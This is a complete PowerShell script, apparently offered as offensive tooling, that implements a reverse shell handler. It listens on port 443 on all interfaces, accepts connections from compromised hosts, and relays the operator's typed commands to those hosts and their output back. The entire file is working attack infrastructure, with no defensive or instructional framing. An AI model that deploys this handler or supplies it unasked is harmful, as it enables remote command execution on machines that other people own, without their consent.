function Invoke-ReverseShellHandler {
    [CmdletBinding()]
    param(
        [Parameter(Mandatory=$false,Position=0)]
        [int]$Port=443,

        [Parameter(Mandatory=$false)]
        [string]$BindAddress="0.0.0.0",

        [Parameter(Mandatory=$false)]
        [string]$PidFile=".\rshandler-$port.pid",

        [Parameter(Mandatory=$false)]
        [switch]$NoBanner
    )

    $endpoint = [System.Net.IPEndPoint]::new(
        ([System.Net.IPAddress]$BindAddress),
        $Port
    )

    $listener = [System.Net.Sockets.TcpListener]::new($endpoint)

    if ($PidFile) {
        $PID | Out-File -FilePath $PidFile -Force -ErrorAction SilentlyContinue
        if (Test-Path $PidFile) {
            $saved = Get-Content $PidFile
            Write-Host "[*] PID $saved written to $PidFile" -ForegroundColor Cyan
            Write-Host "[*] Kill command: Stop-Process -Id $saved -Force" -ForegroundColor Gray
        }
    }

    $listener.Start()
    Write-Host "[*] Reverse shell handler listening on ${BindAddress}:$Port" -ForegroundColor Green
    Write-Host "[*] Waiting for reverse shell connection... (Ctrl+C or type 'exit' to quit)" -ForegroundColor Yellow

    try {
        while ($true) {
            $client = $listener.AcceptTcpClient()
            $remote = $client.Client.RemoteEndPoint.ToString()
            Write-Host "[+] Connection received from $remote" -ForegroundColor Green

            $stream = $client.GetStream()
            $reader = [System.IO.StreamReader]::new($stream)
            $writer = [System.IO.StreamWriter]::new($stream)
            $writer.AutoFlush = $true

            # Read banner/prompt from reverse shell
            try {
                $banner = $reader.ReadLine()
                if ($banner) { Write-Host $banner }
                while ($stream.DataAvailable) {
                    $line = $reader.ReadLine()
                    if ($line -ne $null) { Write-Host $line }
                }
            } catch { }

            while ($client.Connected) {
                $prompt = "handler [$remote]> "
                Write-Host -NoNewline $prompt
                $cmd = Read-Host

                if ($cmd -eq "exit") {
                    Write-Host "[*] Closing connection..." -ForegroundColor Yellow
                    $writer.WriteLine("exit")
                    break
                }

                if ([string]::IsNullOrWhiteSpace($cmd)) { continue }

                try {
                    $writer.WriteLine($cmd)
                } catch {
                    Write-Warning "Failed to send command: $($_.Exception.Message)"
                    break
                }

                Start-Sleep -Milliseconds 200

                try {
                    $output = New-Object System.Text.StringBuilder
                    while ($stream.DataAvailable) {
                        $line = $reader.ReadLine()
                        if ($line -ne $null) {
                            [void]$output.AppendLine($line)
                            Write-Host $line
                        }
                    }

                    if ($output.Length -eq 0) {
                        # Wait longer for slow commands
                        Start-Sleep -Milliseconds 500
                        while ($stream.DataAvailable) {
                            $line = $reader.ReadLine()
                            if ($line -ne $null) {
                                [void]$output.AppendLine($line)
                                Write-Host $line
                            }
                        }
                    }
                } catch {
                    Write-Warning "Failed to read response: $($_.Exception.Message)"
                    break
                }
            }

            try {
                $reader.Dispose()
                $writer.Dispose()
                $stream.Dispose()
                $client.Close()
            } catch { }

            Write-Host "[-] Connection from $remote closed" -ForegroundColor Red
            Write-Host "[*] Waiting for next connection..." -ForegroundColor Yellow
        }
    }
    finally {
        $listener.Stop()
        $listener.Server.Dispose()
        if ($PidFile -and (Test-Path $PidFile)) {
            Remove-Item $PidFile -Force -ErrorAction SilentlyContinue
        }
        Write-Host "[*] Handler stopped." -ForegroundColor Cyan
    }
}

Invoke-ReverseShellHandler @args
